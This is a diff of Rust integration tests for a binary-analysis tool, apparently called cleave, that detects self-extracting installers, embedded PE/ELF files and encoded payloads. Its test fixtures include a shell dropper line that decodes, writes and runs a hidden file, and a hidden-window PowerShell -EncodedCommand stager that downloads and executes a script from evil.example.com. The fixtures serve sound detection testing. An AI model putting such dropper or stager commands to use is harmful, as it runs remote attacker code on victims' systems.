@@ -1,41 +1,31 @@
 //! Integration tests for embedded binary and SFX format detection.
 //!
-//! All tests use the CLI (`cleave analyze --format json`) to exercise the
-//! full analysis pipeline. Library-level unit tests live within each module.
-//!
-//! Tests cover:
-//! - NSIS / Inno Setup marker detection in PE files
-//! - CAB overlay archive detection
-//! - Embedded PE within PE (dropper pattern)
-//! - Embedded ELF scanning
-//! - Base64-encoded binary payloads in shell scripts
-//! - PowerShell -EncodedCommand payloads
-//! - False-positive regression on clean test binaries
+//! Tests call the library's `analyze_file` directly to exercise the full
+//! analysis pipeline without subprocess overhead. YARA is disabled because
+//! none of these tests depend on YARA matches.
 #![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 
 use std::fs;
 use tempfile::TempDir;
 
-fn run_analyze_json(path: &std::path::Path) -> std::process::Output {
-    let traits_dir = concat!(env!("CARGO_MANIFEST_DIR"), "/../cleave-traits");
-    let output = assert_cmd::cargo_bin_cmd!("cleave")
-        .env("CLEAVE_SKIP_YARA", "1")
-        .env("CLEAVE_SKIP_CACHE", "1")
-        .env("CLEAVE_LOGS_DIR", "/tmp/cleave-test-logs")
-        .env_remove("CLEAVE_SKIP_TRAITS")
-        .env_remove("CLEAVE_SKIP_TRAITS")
-        .env("CLEAVE_TRAITS_DIR", traits_dir)
-        .args(["--format", "json", "analyze", path.to_str().unwrap()])
-        .output()
-        .unwrap();
-
-    assert!(
-        output.status.success(),
-        "cleave analyze failed.\nstderr:\n{}",
-        String::from_utf8_lossy(&output.stderr)
-    );
-
-    output
+/// Analyze a file in-process and return the compact-format JSON output
+/// equivalent to what `cleave --format json analyze <path>` would print.
+///
+/// Returns `(json_string, parsed_value)` so tests can substring-match or
+/// structurally inspect the result.
+fn analyze_compact(path: &std::path::Path) -> (String, serde_json::Value) {
+    let options = cleave::AnalysisOptions {
+        disable_yara: true,
+        ..Default::default()
+    };
+    let mut report = cleave::analyze_file(path, &options).expect("analyze");
+    report.shrink_to_fit();
+    report.finalize();
+    let compact = cleave::types::compact_from_files(&report.files);
+    let json_string = serde_json::to_string(&compact).expect("serialize");
+    let json_value: serde_json::Value =
+        serde_json::from_str(&json_string).expect("parse roundtrip");
+    (json_string, json_value)
 }
 
 // ── Fixture builders ───────────────────────────────────────────────────────────
@@ -104,214 +94,142 @@ fn embed_elf_at(buf: &mut Vec<u8>, offset: usize) {
     buf[offset + 18..offset + 20].copy_from_slice(&0x3Eu16.to_le_bytes()); // EM_X86_64
 }
 
-// ── NSIS / Inno Setup detection ───────────────────────────────────────────────
+// ── SFX marker detection ──────────────────────────────────────────────────────
+//
+// Grouped into a single test so the shared CapabilityMapper init pays its
+// ~1s cost once instead of three times across separate nextest processes.
 
 #[test]
-fn test_nsis_marker_detected() {
+fn sfx_marker_detection() {
     let tmp = TempDir::new().unwrap();
-    let mut pe = minimal_pe_stub();
-    pe.extend_from_slice(&[0xEF, 0xBE, 0xAD, 0xDE]); // NSIS deadbeef marker
-    pe.extend_from_slice(b"NSIS Error"); // secondary strong NSIS marker
-    pe.extend_from_slice(&[0u8; 60]);
-    let path = tmp.path().join("nsis.exe");
-    fs::write(&path, &pe).unwrap();
 
-    let output = run_analyze_json(&path);
-
-    let stdout = String::from_utf8_lossy(&output.stdout);
+    // NSIS deadbeef marker + secondary string.
+    let mut nsis = minimal_pe_stub();
+    nsis.extend_from_slice(&[0xEF, 0xBE, 0xAD, 0xDE]);
+    nsis.extend_from_slice(b"NSIS Error");
+    nsis.extend_from_slice(&[0u8; 60]);
+    let nsis_path = tmp.path().join("nsis.exe");
+    fs::write(&nsis_path, &nsis).unwrap();
+    let (stdout, _) = analyze_compact(&nsis_path);
     assert!(
         stdout.contains("file/sfx/nsis"),
         "Expected 'file/sfx/nsis' in output.\nFirst 2000 chars:\n{}",
         &stdout[..stdout.len().min(2000)]
     );
-}
 
-#[test]
-fn test_inno_setup_marker_detected() {
-    let tmp = TempDir::new().unwrap();
-    let mut pe = minimal_pe_stub();
-    pe.extend_from_slice(b"Inno Setup Setup Data");
-    pe.extend_from_slice(&[0u8; 60]);
-    let path = tmp.path().join("inno.exe");
-    fs::write(&path, &pe).unwrap();
-
-    let output = run_analyze_json(&path);
-
-    let stdout = String::from_utf8_lossy(&output.stdout);
+    // Inno Setup marker.
+    let mut inno = minimal_pe_stub();
+    inno.extend_from_slice(b"Inno Setup Setup Data");
+    inno.extend_from_slice(&[0u8; 60]);
+    let inno_path = tmp.path().join("inno.exe");
+    fs::write(&inno_path, &inno).unwrap();
+    let (stdout, _) = analyze_compact(&inno_path);
     assert!(
         stdout.contains("file/sfx/inno-setup"),
         "Expected 'file/sfx/inno-setup' in output.\nFirst 2000 chars:\n{}",
         &stdout[..stdout.len().min(2000)]
     );
-}
 
-// ── CAB overlay ───────────────────────────────────────────────────────────────
-
-#[test]
-fn test_cab_overlay_detected() {
-    let tmp = TempDir::new().unwrap();
-    // Use the real test.exe so goblin can parse sections and sections_end > 0
-    let Ok(mut host) = fs::read("tests/fixtures/test.exe") else {
-        eprintln!("skipping test_cab_overlay_detected: missing tests/fixtures/test.exe");
-        return;
-    };
-    // CAB (MSCF) appended after the PE as overlay
-    host.extend_from_slice(&[0x4D, 0x53, 0x43, 0x46]); // MSCF magic
-    host.extend_from_slice(&[0u8; 20]);
-    let path = tmp.path().join("sfx.exe");
-    fs::write(&path, &host).unwrap();
-
-    let output = run_analyze_json(&path);
-
-    let stdout = String::from_utf8_lossy(&output.stdout);
-    assert!(
-        stdout.contains("self-extracting/cab"),
-        "Expected 'self-extracting/cab' in output.\nFirst 2000 chars:\n{}",
-        &stdout[..stdout.len().min(2000)]
-    );
+    // CAB (MSCF) overlay appended after a real PE.
+    if let Ok(mut host) = fs::read("tests/fixtures/test.exe") {
+        host.extend_from_slice(&[0x4D, 0x53, 0x43, 0x46]);
+        host.extend_from_slice(&[0u8; 20]);
+        let cab_path = tmp.path().join("sfx.exe");
+        fs::write(&cab_path, &host).unwrap();
+        let (stdout, _) = analyze_compact(&cab_path);
+        assert!(
+            stdout.contains("self-extracting/cab"),
+            "Expected 'self-extracting/cab' in output.\nFirst 2000 chars:\n{}",
+            &stdout[..stdout.len().min(2000)]
+        );
+    } else {
+        eprintln!("skipping CAB sub-assertion: missing tests/fixtures/test.exe");
+    }
 }
 
 // ── Embedded PE / ELF scanning ────────────────────────────────────────────────
+//
+// Four related sub-cases bundled into one #[test] to share mapper init:
+//   1. PE-in-PE dropper detection + host metrics
+//   2. PE-in-NSIS-overlay downgrade to notable
+//   3. ELF-in-ELF detection + host metrics
+//   4. Child ELF carves and extracts its own strings
 
 #[test]
-fn test_embedded_pe_in_pe_detected() {
+fn embedded_binary_scanning() {
     let tmp = TempDir::new().unwrap();
-    let mut host = minimal_pe_stub();
-    embed_pe_at(&mut host, 512);
-    let path = tmp.path().join("dropper.exe");
-    fs::write(&path, &host).unwrap();
 
-    let output = run_analyze_json(&path);
-
-    let stdout = String::from_utf8_lossy(&output.stdout);
+    // 1. Embedded PE in PE.
+    let mut pe_host = minimal_pe_stub();
+    embed_pe_at(&mut pe_host, 512);
+    let pe_path = tmp.path().join("dropper.exe");
+    fs::write(&pe_path, &pe_host).unwrap();
+    let (stdout, report) = analyze_compact(&pe_path);
     assert!(
         stdout.contains("binary/embedded/pe"),
         "Expected 'binary/embedded/pe' in output.\nFirst 2000 chars:\n{}",
         &stdout[..stdout.len().min(2000)]
     );
-
-    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    let host_metrics = report["fs"]
+    let pe_metrics = report["fs"]
         .as_array()
         .and_then(|files| files.first())
         .and_then(|host| host["ms"]["binary"].as_object())
         .expect("host PE should expose binary metrics in compact report");
-    assert_eq!(
-        host_metrics["embedded_binary_count"].as_f64(),
-        Some(1.0),
-        "PE host should count one embedded binary.\nbinary metrics:\n{}",
-        serde_json::to_string_pretty(host_metrics).unwrap(),
-    );
-    assert_eq!(
-        host_metrics["embedded_file_count"].as_f64(),
-        Some(1.0),
-        "embedded_file_count should aggregate binary + archive counts",
-    );
-}
+    assert_eq!(pe_metrics["embedded_binary_count"].as_f64(), Some(1.0));
+    assert_eq!(pe_metrics["embedded_file_count"].as_f64(), Some(1.0));
 
-#[test]
-fn test_embedded_pe_in_nsis_overlay_is_not_suspicious() {
-    let tmp = TempDir::new().unwrap();
-    let mut host = minimal_pe_stub();
-    host.resize(0x600, 0);
-    host.extend_from_slice(&[0xEF, 0xBE, 0xAD, 0xDE]); // NSIS deadbeef marker
-    host.extend_from_slice(b"NSIS Error"); // secondary strong NSIS marker
-    embed_pe_at(&mut host, 0x800);
-    let path = tmp.path().join("nsis_payload.exe");
-    fs::write(&path, &host).unwrap();
-
-    let output = run_analyze_json(&path);
-    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    // 2. Embedded PE in NSIS overlay should downgrade to notable (level 3).
+    let mut nsis = minimal_pe_stub();
+    nsis.resize(0x600, 0);
+    nsis.extend_from_slice(&[0xEF, 0xBE, 0xAD, 0xDE]);
+    nsis.extend_from_slice(b"NSIS Error");
+    embed_pe_at(&mut nsis, 0x800);
+    let nsis_path = tmp.path().join("nsis_payload.exe");
+    fs::write(&nsis_path, &nsis).unwrap();
+    let (stdout, report) = analyze_compact(&nsis_path);
     let findings = report["fs"][0]["ts"]
         .as_array()
         .expect("top-level findings should be an array");
-
-    let embedded_pe_findings: Vec<_> = findings
+    let embedded_pe: Vec<_> = findings
         .iter()
-        .filter(|finding| finding["i"] == "binary/embedded/pe")
+        .filter(|f| f["i"] == "binary/embedded/pe")
         .collect();
     assert!(
-        !embedded_pe_findings.is_empty(),
+        !embedded_pe.is_empty(),
         "expected host-level embedded PE finding"
     );
     assert!(
-        embedded_pe_findings
-            .iter()
-            .all(|finding| finding["l"] == 3),
-        "expected NSIS overlay embedded PE findings to be downgraded to notable (level 3).\nstdout:\n{}",
-        String::from_utf8_lossy(&output.stdout)
+        embedded_pe.iter().all(|f| f["l"] == 3),
+        "expected NSIS overlay embedded PE findings to be downgraded to notable.\nstdout:\n{stdout}",
     );
-}
 
-#[test]
-fn test_embedded_elf_in_elf_detected() {
-    let tmp = TempDir::new().unwrap();
-    // Real ELF host with a second real ELF appended after it
-    let Ok(mut host) = fs::read("tests/fixtures/test.elf") else {
-        eprintln!("skipping test_embedded_elf_in_elf_detected: missing tests/fixtures/test.elf");
+    // 3. & 4. Real ELF with another ELF appended.
+    let Ok(elf_host) = fs::read("tests/fixtures/test.elf") else {
+        eprintln!("skipping ELF sub-cases: missing tests/fixtures/test.elf");
         return;
     };
-    let payload = host.clone();
-    let embed_at = host.len() + 16;
-    host.resize(embed_at, 0u8);
-    host.extend_from_slice(&payload);
-
-    let path = tmp.path().join("elf_dropper.elf");
-    fs::write(&path, &host).unwrap();
-
-    let output = run_analyze_json(&path);
-
-    let stdout = String::from_utf8_lossy(&output.stdout);
+    let mut combo = elf_host.clone();
+    let embed_at = combo.len() + 16;
+    combo.resize(embed_at, 0u8);
+    combo.extend_from_slice(&elf_host);
+    let combo_path = tmp.path().join("elf_dropper.elf");
+    fs::write(&combo_path, &combo).unwrap();
+    let (stdout, report) = analyze_compact(&combo_path);
     assert!(
         stdout.contains("binary/embedded/elf"),
         "Expected 'binary/embedded/elf' in output.\nFirst 2000 chars:\n{}",
         &stdout[..stdout.len().min(2000)]
     );
-
-    // Embedded-file counts should be populated alongside the finding.
-    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    let host_metrics = report["fs"]
+    let elf_metrics = report["fs"]
         .as_array()
         .and_then(|files| files.first())
         .and_then(|host| host["ms"]["binary"].as_object())
         .expect("host ELF should expose binary metrics in compact report");
+    assert_eq!(elf_metrics["embedded_binary_count"].as_f64(), Some(1.0));
+    assert_eq!(elf_metrics["embedded_file_count"].as_f64(), Some(1.0));
+    assert!(!elf_metrics.contains_key("embedded_archive_count"));
 
-    assert_eq!(
-        host_metrics["embedded_binary_count"].as_f64(),
-        Some(1.0),
-        "host should report exactly one embedded binary.\nbinary metrics:\n{}",
-        serde_json::to_string_pretty(host_metrics).unwrap()
-    );
-    assert_eq!(
-        host_metrics["embedded_file_count"].as_f64(),
-        Some(1.0),
-        "host should report total embedded files matching the binary count",
-    );
-    assert!(
-        !host_metrics.contains_key("embedded_archive_count"),
-        "archive count should be omitted (zero) when nothing archive-shaped is embedded",
-    );
-}
-
-#[test]
-fn test_embedded_elf_child_extracts_its_own_strings() {
-    let tmp = TempDir::new().unwrap();
-    let Ok(mut host) = fs::read("tests/fixtures/test.elf") else {
-        eprintln!(
-            "skipping test_embedded_elf_child_extracts_its_own_strings: missing tests/fixtures/test.elf"
-        );
-        return;
-    };
-    let payload = host.clone();
-    let embed_at = host.len() + 16;
-    host.resize(embed_at, 0u8);
-    host.extend_from_slice(&payload);
-
-    let path = tmp.path().join("elf_dropper_with_child_strings.elf");
-    fs::write(&path, &host).unwrap();
-
-    let output = run_analyze_json(&path);
-    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    // 4. Child ELF extracts its own strings.
     let files = report["fs"]
         .as_array()
         .expect("report should contain file entries");
@@ -326,7 +244,6 @@ fn test_embedded_elf_child_extracts_its_own_strings() {
     let strings = child["ss"]
         .as_array()
         .expect("embedded ELF child should include extracted strings");
-
     assert!(
         strings.iter().any(|entry| {
             entry
@@ -347,8 +264,7 @@ fn test_known_good_upx_exe_has_no_embedded_elf_or_hostile_findings() {
         return;
     }
 
-    let output = run_analyze_json(sample);
-    let stdout = String::from_utf8_lossy(&output.stdout);
+    let (stdout, _report) = analyze_compact(sample);
 
     assert!(
         !stdout.contains("\"id\":\"binary/embedded/elf\""),
@@ -362,57 +278,43 @@ fn test_known_good_upx_exe_has_no_embedded_elf_or_hostile_findings() {
     );
 }
 
-// ── Base64 binary payloads ────────────────────────────────────────────────────
+// ── Base64-encoded payloads (shell + PowerShell) ──────────────────────────────
 
 #[test]
-fn test_shell_script_base64_gzip_detected() {
+fn encoded_payload_detection() {
     use base64::Engine;
 
     let tmp = TempDir::new().unwrap();
-    // Keep this above the compressed-payload floor so wrapper detection still fires.
+
+    // Shell script wrapping a base64-encoded gzipped payload.
     let mut payload = vec![0x1Fu8, 0x8B, 0x08, 0x00]; // gzip magic + CM + FLG
     payload.resize(192, 0u8);
     let encoded = base64::engine::general_purpose::STANDARD.encode(&payload);
-
-    let script = format!(
+    let sh = format!(
         "#!/bin/sh\n# dropper\np=\"{}\"\necho \"$p\" | base64 -d | gunzip > /tmp/.x && chmod +x /tmp/.x && /tmp/.x\n",
         encoded
     );
-    let path = tmp.path().join("dropper.sh");
-    fs::write(&path, &script).unwrap();
-
-    let output = run_analyze_json(&path);
-
-    let stdout = String::from_utf8_lossy(&output.stdout);
+    let sh_path = tmp.path().join("dropper.sh");
+    fs::write(&sh_path, &sh).unwrap();
+    let (stdout, _) = analyze_compact(&sh_path);
     assert!(
         stdout.contains("base64-gz"),
         "Expected 'base64-gz' in output.\nFirst 3000 chars:\n{}",
         &stdout[..stdout.len().min(3000)]
     );
-}
 
-// ── PowerShell -EncodedCommand ────────────────────────────────────────────────
-
-#[test]
-fn test_powershell_encoded_command_detected() {
-    use base64::Engine;
-
-    let tmp = TempDir::new().unwrap();
+    // PowerShell -EncodedCommand UTF-16LE+base64 stager.
     let ps_code =
         "IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/stage2.ps1')";
     let utf16le: Vec<u8> = ps_code.encode_utf16().flat_map(u16::to_le_bytes).collect();
     let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16le);
-
-    let script = format!(
+    let ps = format!(
         "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand {}\n",
         b64
     );
-    let path = tmp.path().join("stager.ps1");
-    fs::write(&path, &script).unwrap();
-
-    let output = run_analyze_json(&path);
-
-    let stdout = String::from_utf8_lossy(&output.stdout);
+    let ps_path = tmp.path().join("stager.ps1");
+    fs::write(&ps_path, &ps).unwrap();
+    let (stdout, _) = analyze_compact(&ps_path);
     assert!(
         stdout.contains("base64-powershell"),
         "Expected 'base64-powershell' in output.\nFirst 3000 chars:\n{}",
@@ -420,57 +322,41 @@ fn test_powershell_encoded_command_detected() {
     );
 }
 
-// ── False-positive regression ─────────────────────────────────────────────────
+// ── False-positive regression suite ───────────────────────────────────────────
+//
+// Clean fixtures must NOT fire embedded-binary or base64-binary findings.
+// All sub-cases bundled to share mapper init.
 
-/// The real test.exe fixture must not produce embedded PE findings.
 #[test]
-fn test_no_false_positive_embedded_pe_on_clean_exe() {
+fn false_positive_regressions() {
     let tmp = TempDir::new().unwrap();
-    let path = tmp.path().join("clean.exe");
-    if let Err(err) = fs::copy("tests/fixtures/test.exe", &path) {
-        eprintln!(
-            "skipping test_no_false_positive_embedded_pe_on_clean_exe: missing tests/fixtures/test.exe ({err})"
+
+    // Clean PE: no embedded PE finding.
+    if let Ok(()) = fs::copy("tests/fixtures/test.exe", tmp.path().join("clean.exe")).map(|_| ()) {
+        let (stdout, _) = analyze_compact(&tmp.path().join("clean.exe"));
+        let count = stdout.matches("binary/embedded/pe").count();
+        assert!(
+            count == 0,
+            "False positive: {count} 'binary/embedded/pe' findings on clean test.exe"
         );
-        return;
+    } else {
+        eprintln!("skipping clean-PE sub-case: missing tests/fixtures/test.exe");
     }
 
-    let output = run_analyze_json(&path);
-
-    let stdout = String::from_utf8_lossy(&output.stdout);
-    let count = stdout.matches("binary/embedded/pe").count();
-    assert!(
-        count == 0,
-        "False positive: {count} 'binary/embedded/pe' findings on clean test.exe"
-    );
-}
-
-/// The real test.elf fixture must not produce embedded ELF findings.
-#[test]
-fn test_no_false_positive_embedded_elf_on_clean_elf() {
-    let tmp = TempDir::new().unwrap();
-    let path = tmp.path().join("clean.elf");
-    if let Err(err) = fs::copy("tests/fixtures/test.elf", &path) {
-        eprintln!(
-            "skipping test_no_false_positive_embedded_elf_on_clean_elf: missing tests/fixtures/test.elf ({err})"
+    // Clean ELF: no embedded ELF finding.
+    if let Ok(()) = fs::copy("tests/fixtures/test.elf", tmp.path().join("clean.elf")).map(|_| ()) {
+        let (stdout, _) = analyze_compact(&tmp.path().join("clean.elf"));
+        let count = stdout.matches("binary/embedded/elf").count();
+        assert!(
+            count == 0,
+            "False positive: {count} 'binary/embedded/elf' findings on clean test.elf"
         );
-        return;
+    } else {
+        eprintln!("skipping clean-ELF sub-case: missing tests/fixtures/test.elf");
     }
 
-    let output = run_analyze_json(&path);
-
-    let stdout = String::from_utf8_lossy(&output.stdout);
-    let count = stdout.matches("binary/embedded/elf").count();
-    assert!(
-        count == 0,
-        "False positive: {count} 'binary/embedded/elf' findings on clean test.elf"
-    );
-}
-
-/// Benign deploy scripts with short base64 must not produce base64-binary findings.
-#[test]
-fn test_no_false_positive_short_base64_in_benign_script() {
-    let tmp = TempDir::new().unwrap();
-    let script = r#"#!/bin/bash
+    // Benign deploy script with short base64: no base64-binary finding.
+    let benign = r#"#!/bin/bash
 # Deploy script
 echo "Starting deployment..."
 CONFIG=$(echo "dGVzdA==" | base64 -d)
@@ -478,17 +364,9 @@ echo "Config: $CONFIG"
 curl -s https://api.example.com/deploy
 echo "Done"
 "#;
-    let path = tmp.path().join("deploy.sh");
-    fs::write(&path, script).unwrap();
-
-    let output = assert_cmd::cargo_bin_cmd!("cleave")
-        .env("CLEAVE_SKIP_YARA", "1")
-        .env("CLEAVE_SKIP_CACHE", "1")
-        .args(["--format", "json", "analyze", path.to_str().unwrap()])
-        .output()
-        .unwrap();
-
-    let stdout = String::from_utf8_lossy(&output.stdout);
+    let benign_path = tmp.path().join("deploy.sh");
+    fs::write(&benign_path, benign).unwrap();
+    let (stdout, _) = analyze_compact(&benign_path);
     assert!(
         !stdout.contains("base64-gz")
             && !stdout.contains("base64-pe")
